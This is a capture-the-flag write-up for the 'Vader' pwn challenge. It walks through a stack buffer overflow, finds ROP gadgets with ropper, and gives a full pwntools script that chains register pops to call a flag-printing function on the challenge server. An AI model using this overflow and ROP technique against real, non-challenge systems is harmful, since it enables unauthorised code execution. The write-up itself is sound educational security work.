---
title: "shctf/pwn: Vader"
date: 2022-06-07 10:41:26
tags:
- ctf
- shctf
- pwn
description: "Learn how to exploit ELF binaries using ROP, building a chain of \"gadgets\" on the stack to pass arguments to a function! This is my writeup for the Space Heroes CTF binary/pwn challenge \"Vader\"."
permalink: ctfs/shctf/pwn/vader/
thumbnail: https://enscribe.dev/asset/banner/banner-vader.png
---

<style>
    .box {
        border: 1px solid rgba(100, 100, 100, .5);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
    }
    .flex-container {
        display: flex;
        flex-wrap: nowrap;
        justify-content: center;
    }
</style>

<p class="box">
Submit flag from <code>/flag.txt</code> from <code>0.cloud.chals.io:20712</code><br>
<b>Author</b>: v10l3nt<br>
<b>Files</b>: <a href="/asset/shctf/vader">vader</a>
</p>

```text
[*] '/home/kali/ctfs/shctf/pwn/vader/vader'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

As with any binary-only challenge, the first thing we must do is boot it up in the **Ghidra** disassembler. Looking through the code we can check what our main function does:

```c
undefined8 main(void)

{
  char local_28 [32];
  
  print_darth();
  printf("\n\nWhen I left you, I was but the learner. Now I am the master >>> ");
  fgets(local_28,0x100,stdin);
  return 0;
}
```

Looks like it reads our input (`stdin`) with a fixed length (256) through `fgets()`. Let's continue sifting around:

```c
void vader(char *param_1,char *param_2,char *param_3,char *param_4,char *param_5)

{
  int iVar1;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  FILE *local_10;
  
  iVar1 = strcmp(param_1,"DARK");
  if (iVar1 == 0) {
    iVar1 = strcmp(param_2,"S1D3");
    if (iVar1 == 0) {
      iVar1 = strcmp(param_3,"OF");
      if (iVar1 == 0) {
        iVar1 = strcmp(param_4,"TH3");
        if (iVar1 == 0) {
          iVar1 = strcmp(param_5,"FORC3");
          if (iVar1 == 0) {
            local_38 = 0;
            local_30 = 0;
            local_28 = 0;
            local_20 = 0;
            local_10 = (FILE *)0x0;
            local_10 = fopen("flag.txt","r");
            fgets((char *)&local_38,0x30,local_10);
            printf("<<< %s\n",&local_38);
          }
        }
      }
    }
    else {
      printf("You are a wretched thing, of weakness and fear.");
    }
    exit(1);
  }
  return;
}
```

The goal is now clear: call the `vader()` function with five correct arguments to print the flag. Simple, right? Let's start building our chain.

Firstly, we need to calculate our **offset**. Although we can brute this by simply pasing a `cyclic` string and seeing what's overwritten the `$rsp` register, we can see that in the `main()` function, 32 bytes are allocated to `char local_28`. If we add 8 bytes to cover the `$rbp` register, our offset is 40.

Next in line is the process of getting our arguments on the stack. Arguments to be passed into functions are held in **registers** -- since this is a 64-bit binary, we need to figure out which ones we need to use to pass the correct arguments (`DARK`, `S1D3`, `OF`, `TH3`, `FORC3`) into `vader()`. Referencing [this x64 cheatsheet](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf):

> To call a function, the program should place the first six integer or pointer parameters in the registers $rdi, $rsi, $rdx, $rcx, $r8, and $r9; subsequent parameters (or parameters larger than 64 bits) should be pushed onto the stack, with the first argument topmost. The program should then execute the call instruction, which will push the return address onto the stack and jump to the start of the specified function.

Therefore, we need to put our arguments into `$rdi`, `$rsi`, `$rdx`, `$rcx`, and `$r8`. The main method of doing this is via **gadgets**, or simple assembly instructions that can be used to `pop` specific registers from the stack. After the `pop`, we can repopulate the register with our own address that represents the required string (this address will be located within the binary). Additionally, they almost always have a `ret` instruction at the end to return to *even more* gadgets, therefore creating a **ROP chain**.

**Note**: The program literally provides gadget functions for you:

```properties
00000000004011c9 <gadget1>:
  4011c9: 55                    push   rbp
  4011ca: 48 89 e5              mov    rbp,rsp
  4011cd: 59                    pop    rcx
  4011ce: 5a                    pop    rdx
  4011cf: c3                    ret    
  4011d0: 90                    nop
  4011d1: 5d                    pop    rbp
  4011d2: c3                    ret    

00000000004011d3 <gadget2>:
  4011d3: 55                    push   rbp
  4011d4: 48 89 e5              mov    rbp,rsp
  4011d7: 41 59                 pop    r9
  4011d9: 41 58                 pop    r8
  4011db: c3                    ret    
  4011dc: 90                    nop
  4011dd: 5d                    pop    rbp
  4011de: c3                    ret    
```

Although you can use these, it's not really in the nature of a ROP challenge, so I will be finding the gadgets manually!

To find the gadgets we need, we will be utilizing a program called `ropper` and `grep`-ing the output:

```console
root@kali~$ ropper -f vader | grep "rdi"
```

```properties
0x000000000040145e: add byte ptr [rax], al; mov rdi, rax; call 0x1030; nop; pop rbp; ret; 
0x00000000004011bc: add byte ptr [rax], al; mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x00000000004015e9: add byte ptr [rax], al; mov rdi, rax; call 0x1060; mov eax, 0; leave; ret; 
0x00000000004010b7: mov ecx, 0x401600; mov rdi, 0x4015b5; call qword ptr [rip + 0x3f26]; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004010b6: mov rcx, 0x401600; mov rdi, 0x4015b5; call qword ptr [rip + 0x3f26]; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004010bd: mov rdi, 0x4015b5; call qword ptr [rip + 0x3f26]; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401460: mov rdi, rax; call 0x1030; nop; pop rbp; ret; 
0x00000000004011be: mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x00000000004015eb: mov rdi, rax; call 0x1060; mov eax, 0; leave; ret; 
0x00000000004010f6: or dword ptr [rdi + 0x405060], edi; jmp rax; 
0x000000000040165b: pop rdi; ret; 
```

Check it out -- on line 14 (`0x40165b`) there's a perfect gadget for us to use! Let's find ones for the rest of them:

```properties
0x0000000000401659: pop rsi; pop r15; ret;
0x00000000004011ce: pop rdx; ret; 
0x00000000004011d8: pop rcx; pop r8; ret; 
```

The first `pop rsi; pop r15;` isn't ideal, as it's popping a redundant register -- we'll need to repopulate it with 8 bytes of garbage. On the other hand, the `pop rcx; pop r8;` takes care of two registers at once!

With that, we can draw up a visual of what our final payload will look like:

![Payload Visual](/asset/shctf/payload-visual.png)

The last thing we need to do is to find the hex addresses of our argument strings:

<img src="/asset/shctf/strings.png">
<center><sub>String data in Ghidra</sub></center>

Don't forget the address of `vader()` too!:

```console
gef➤  x vader
0x40146b <vader>: 0xe5894855
```

Here is my final script, which defines a variable for each section of our gigantic payload -- this is for enhanced readability. I've also used the `p64()` function, which converts the address into little endian:

```py
from pwn import *

offset =        b'A'*40         # OVERFLOWING 32 + 8 BYTES FOR $RBP

rdi =           p64(0x0040165b) # RDI, RSI, RDX, RCX, & R8 ARE ARGS REGISTERS
rsi_r15 =       p64(0x00401659)
rdx =           p64(0x004011ce)
rcx_r8 =        p64(0x004011d8)

dark =          p64(0x00402ec9) # ADDRESSES FOR STRINGS IN THE BINARY
side =          p64(0x00402ece)
r15_garbage =   p64(0xCAFEBEEF) # GARBAGE
of =            p64(0x00402ed3)
the =           p64(0x00402ed6)
force =         p64(0x00402eda)

vader =         p64(0x0040146b)

payload = offset
payload += rdi + dark                   # POP RDI, STORING "DARK"
payload += rsi_r15 + side + r15_garbage # POP RSI & R15, STORE "S1D3" + GARBAGE
payload += rdx + of                     # POP RDX, STORING "OF"
payload += rcx_r8 + the + force         # POP RCX & R8, STORING "TH3" + "FORC3"
payload += vader                        # ADDRESS OF VADER

p = remote("0.cloud.chals.io", 20712)
p.sendline(payload)
log.success(p.recvallS())
p.close()
```

I don't usually do this, but here's a clip of me initially solving the challenge by running the above script:

<div align="center"><iframe width="600" height="355" src="https://www.youtube.com/embed/rvMORfSC2CU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

This is considered a "simple" challenge for those experienced with the field of return-oriented programming within pwn/binary challenges. However, I had none prior to this competition, so <kbd>Vader</kbd> was one of the most time-consuming and annoying challenges to work with. Yet, it was probably the most satisfying solve throughout the entire competition, and it was my first time utilizing gadgets and building a ROP chain. I hope you enjoyed!

<a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
